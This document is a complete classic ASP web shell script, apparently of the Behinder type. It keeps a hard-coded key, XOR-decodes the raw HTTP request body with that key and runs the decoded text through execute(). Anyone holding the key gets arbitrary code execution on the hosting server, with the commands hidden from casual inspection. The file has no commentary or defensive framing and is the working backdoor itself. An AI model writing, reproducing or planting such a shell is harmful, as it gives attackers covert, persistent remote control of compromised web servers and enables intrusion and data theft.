<%
Response.CharSet = "UTF-8" 
k="0dfeb233de040de5"
Session("k")=k
size=Request.TotalBytes
content=Request.BinaryRead(size)
For i=1 To size
result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
execute(result)
%>